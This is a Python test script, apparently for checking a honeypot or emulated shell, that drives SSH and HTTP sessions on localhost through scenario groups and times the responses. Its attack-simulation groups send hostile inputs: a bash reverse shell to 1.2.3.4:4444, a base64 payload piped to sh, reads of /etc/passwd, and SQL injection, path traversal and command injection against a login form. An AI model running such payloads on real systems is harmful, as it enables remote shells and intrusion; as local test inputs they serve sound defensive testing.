import paramiko
import time
import requests
import json
import base64
import sys

sys.stdout.reconfigure(encoding='utf-8')

def get_ssh_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect("127.0.0.1", port=2222, username="root", password="password", timeout=5)
    shell = client.invoke_shell()
    shell.settimeout(3.0)
    time.sleep(0.5)
    if shell.recv_ready():
        shell.recv(4096)
    return client, shell

def run_ssh_cmd(shell, cmd, wait=1.0):
    start = time.time()
    shell.send(cmd + "\n")
    time.sleep(wait)
    out = ""
    while shell.recv_ready():
        try:
            out += shell.recv(4096).decode('utf-8', errors='ignore')
        except:
            pass
    elapsed = time.time() - start
    
    # clean up the command prompt echo
    lines = out.split('\n')
    cleaned = []
    for line in lines:
        if cmd in line: continue
        if '#' in line or '$' in line: continue
        cleaned.append(line.strip())
    
    return elapsed, "\n".join(cleaned).strip()

def run_http_post(payload):
    start = time.time()
    try:
        res = requests.post("http://127.0.0.1:8080/login", data={"username": payload, "password": "password"}, timeout=5)
        elapsed = time.time() - start
        return elapsed, res.status_code, res.text
    except Exception as e:
        return time.time()-start, 0, str(e)

if __name__ == "__main__":
    print("=== SCENARIO GROUP 1: BASIC SHELL BEHAVIOR ===")
    client, shell = get_ssh_shell()
    
    # 1. pwd
    t, out = run_ssh_cmd(shell, "pwd")
    print(f"1. pwd ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    # 2. ls
    t, out = run_ssh_cmd(shell, "ls")
    print(f"2. ls ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    # 3. cd valid
    t, out = run_ssh_cmd(shell, "mkdir secret 2>/dev/null; cd secret; pwd")
    print(f"3. cd secret; pwd ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    # reset dir
    run_ssh_cmd(shell, "cd /root")
    
    # 4. cd invalid
    t, out = run_ssh_cmd(shell, "cd nonexistent")
    print(f"4. cd nonexistent ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    # 5. touch
    t, out = run_ssh_cmd(shell, "touch test.txt")
    print(f"5. touch test.txt ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    print("=== SCENARIO GROUP 2: FILE ACCESS ===")
    # setup creds
    run_ssh_cmd(shell, "echo 'admin:password' > credentials.txt")
    
    # 6. cat existing file
    t, out = run_ssh_cmd(shell, "cat credentials.txt")
    print(f"6. cat credentials.txt ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    # 7. cat non-existing file
    t, out = run_ssh_cmd(shell, "cat unknown.txt")
    print(f"7. cat unknown.txt ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    print("=== SCENARIO GROUP 3: COMMAND CONSISTENCY ===")
    # 8. repeated ls
    client2, shell2 = get_ssh_shell()
    t1, out1 = run_ssh_cmd(shell2, "ls")
    t2, out2 = run_ssh_cmd(shell2, "ls")
    t3, out3 = run_ssh_cmd(shell2, "ls")
    print(f"8. repeated ls\nOut1: {repr(out1)}\nOut2: {repr(out2)}\nOut3: {repr(out3)}\n")
    
    # 9. repeated cat
    t1, out1 = run_ssh_cmd(shell2, "cat /etc/passwd")
    t2, out2 = run_ssh_cmd(shell2, "cat /etc/passwd")
    print(f"9. repeated cat\nOut1: {repr(out1)}\nOut2: {repr(out2)}\n")
    
    print("=== SCENARIO GROUP 4: INVALID COMMANDS ===")
    t, out = run_ssh_cmd(shell2, "asdasd")
    print(f"10. asdasd ({t*1000:.0f}ms)\nOutput: {repr(out)}\n")
    
    print("=== SCENARIO GROUP 5: ENUMERATION ===")
    t1, out1 = run_ssh_cmd(shell2, "whoami")
    t2, out2 = run_ssh_cmd(shell2, "id")
    print(f"11. whoami ({t1*1000:.0f}ms)\nOutput: {repr(out1)}\n")
    print(f"12. id ({t2*1000:.0f}ms)\nOutput: {repr(out2)}\n")

    print("=== SCENARIO GROUP 6: ATTACK SIMULATION (SSH) ===")
    t1, out1 = run_ssh_cmd(shell2, "ls; whoami", wait=2.0)
    print(f"13. ls; whoami ({t1*1000:.0f}ms)\nOutput: {repr(out1)}\n")
    
    t2, out2 = run_ssh_cmd(shell2, "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", wait=2.0)
    print(f"14. reverse shell ({t2*1000:.0f}ms)\nOutput: {repr(out2)}\n")
    
    t3, out3 = run_ssh_cmd(shell2, "echo d2hvYW1p | base64 -d | sh", wait=2.0)
    print(f"15. base64 payload ({t3*1000:.0f}ms)\nOutput: {repr(out3)}\n")
    client.close()
    client2.close()

    print("=== SCENARIO GROUP 7: HTTP ATTACKS ===")
    t1, c1, out1 = run_http_post("' OR 1=1 --")
    print(f"16. SQLi ({t1*1000:.0f}ms)\nStatus: {c1}\nOutput: {repr(out1)}\n")

    t2, c2, out2 = run_http_post("../../../etc/passwd")
    print(f"17. Path Traversal ({t2*1000:.0f}ms)\nStatus: {c2}\nOutput: {repr(out2)}\n")

    t3, c3, out3 = run_http_post("; whoami")
    print(f"18. Command Injection HTTP ({t3*1000:.0f}ms)\nStatus: {c3}\nOutput: {repr(out3)}\n")

    print("=== SCENARIO GROUP 8: CONTEXT CONSISTENCY ===")
    client3, shell3 = get_ssh_shell()
    run_ssh_cmd(shell3, "mkdir -p /root/secret")
    run_ssh_cmd(shell3, "cd /root/secret")
    t1, out1 = run_ssh_cmd(shell3, "pwd")
    t2, out2 = run_ssh_cmd(shell3, "ls")
    print(f"19. Context Consistency\npwd output: {repr(out1)}\nls output: {repr(out2)}\n")
    
    print("=== SCENARIO GROUP 9: PERFORMANCE ===")
    t1, out1 = run_ssh_cmd(shell3, "ls")
    t2, out2 = run_ssh_cmd(shell3, "pwd")
    print(f"20. Fast commands\nls time: {t1*1000:.0f}ms\npwd time: {t2*1000:.0f}ms\n")
